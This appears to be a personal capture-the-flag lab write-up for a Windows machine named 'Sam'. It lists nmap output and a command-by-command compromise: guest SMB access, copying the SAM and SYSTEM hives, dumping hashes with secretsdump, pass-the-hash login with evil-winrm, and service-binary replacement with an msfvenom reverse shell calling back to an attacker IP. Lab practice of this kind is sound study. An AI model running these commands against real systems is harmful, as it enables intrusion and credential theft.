---
tags: [AD, Beginner, Video]
title: Sam
created: '2020-07-06T18:26:53.207Z'
modified: '2020-10-02T17:41:42.719Z'
---

# Sam
- IP: `172.31.1.18`
- OS: `Windows`
## Enumeration
### Writeup
We can login as guest on SMB: `smbclient.py SAM/sdfsdfsdafdsafasdfst@172.31.1.18`
We mount the backup share: `mount -t cifs -o username=asdklfsadf,password= //172.31.1.18/backups /mnt/backups/`

We find SAM and SYSTEM file:
- `cp /mnt/backups/Windows/System32/config/SAM .`
- `cp /mnt/backups/Windows/System32/config/SYSTEM .`
We dump their creds using: `secretsdump.py -sam SAM -system SYSTEM LOCAL`

We get a shell as jamie using: `evil-winrm -i 172.31.1.18 -u jamie -H 68b1d3b0493ec0d6a1c0b8725062ab71`

We see the services folder and see there are 2 services. `services`
We follow the [cheatsheet](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation#services)
Can we do anything with this service? `cmd /c 'sc sdshow monitor1'`
- Can we modify the service: `cmd /c 'sc config monitor2 binpath="C:/test.exe"'`
- Can we modify the binary it's running?
  - `cmd /c 'sc qc monitor1'` qc = query configuration
  - `icacls "C:\Services\monitor1.exe"` Integrity Control Access Control List"
  - `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.8 LPORT=1234 -f exe > monitor1.exe`
  - `sc start monitor1`
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.1.18`
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SAM
|   NetBIOS_Domain_Name: SAM
|   NetBIOS_Computer_Name: SAM
|   DNS_Domain_Name: SAM
|   DNS_Computer_Name: SAM
|   Product_Version: 10.0.14393
|_  System_Time: 2020-07-06T18:35:46+00:00
| ssl-cert: Subject: commonName=SAM
| Issuer: commonName=SAM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-08T22:33:11
| Not valid after:  2020-11-07T22:33:11
| MD5:   03ae b18c 6555 e7e2 0377 2e61 ea5e 8864
|_SHA-1: 00c0 fc67 3a6c f582 dc8e 2717 ce36 14b6 c8ea fc12
|_ssl-date: 2020-07-06T18:35:51+00:00; +2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
